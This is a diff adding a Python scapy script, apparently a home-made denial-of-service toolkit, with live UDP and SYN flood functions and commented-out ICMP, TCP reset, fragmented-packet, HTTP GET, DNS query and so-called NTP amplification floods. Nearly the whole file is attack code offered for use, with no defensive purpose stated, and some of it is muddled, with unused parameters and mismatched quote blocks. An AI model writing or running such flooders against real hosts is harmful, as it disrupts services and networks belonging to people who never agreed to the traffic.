@@ -1,0 +1,107 @@
+from scapy.all import *
+
+from scapy.layers.inet import TCP ,IP,UDP,ICMP
+
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+def obada(dstip ,srcport,dstport ,forc,count ):
+ for i in range(forc):
+    ip_packet = IP(dst=dstip)/UDP(sport=srcport,dport=dstport)
+
+
+    # Combine the Ethernet frame, IP packet, and TCP segment
+    # Display the packet summary
+    send(ip_packet)
+
+
+
+
+
+
+
+
+
+
+
+
+
+def syn_attack(ip,port,forc,count):
+    for i in range(forc):
+       ack_packet=IP(dst=ip) / TCP(dport=port,flags="S")
+
+       send(ack_packet,count=count)#,count=100)#,count=count)
+       print("packet sent")
+
+
+'''def udp_flood(target_ip, target_port, num_packets,count):
+   for i in range(num_packets):
+       udp_packet = IP(dst=target_ip) / UDP(dport=target_port)
+       send(udp_packet,count=count)
+
+def icmp(ip,port,forc,count):
+    for i in range(forc):
+        packet = IP(dst=ip) / ICMP()
+        send(packet,count=count)
+
+
+def reset(target_ip,port,forc,count):
+    for i in range(forc):
+        syn_packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
+
+
+        send(syn_packet,count=count)
+
+
+        rst_packet = IP(dst=target_ip) / TCP(dport=port, flags="R")
+
+
+        send(rst_packet,count=count)'''
+
+'''def send_fragmented_packet(dst_ip, src_ip, data,):
+    # Create the IP header
+    for i in range(10000):
+        ip_header = IP(dst=dst_ip, src=src_ip, proto=1)
+    
+        # Create the TCP header
+        tcp_header = TCP(dport=80, sport=4444, flags="S")
+    
+        # Create the payload
+        payload = data
+    
+        # Fragment the packet
+        fragmented_packet = ip_header / tcp_header / payload
+        fragmented_packet.frag = 0
+        fragmented_packet.flags = 1
+    
+   
+        send(fragmented_packet)
+
+
+def send_http_get(target_ip, target_port):
+    for i in range(100000):
+        get_request = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n"
+        send(IP(dst=target_ip) / TCP(dport=target_port) / get_request)
+
+""""
+def send_dns_query(domain, ip):
+    for i in range(1900000):
+        dns_query = DNSQR(qname=domain)
+        dns_packet = IP(dst=ip) / UDP() / dns_query
+        send(dns_packet)
+"""
+
+def ntp():
+     
+    target_ip = "192.168.1.1"
+    
+     
+    ntp_server_ip = "10.0.0.1"
+    
+     
+    ntp_packet = IP(dst=target_ip) / UDP(dport=123) / NTP()
+    
+    # Send the NTP packet to the NTP server
+    send(ntp_packet, iface="eth0")
+    
+    # Print a message to the console
+    print("NTP amplification DoS attack sent to", target_ip)'''
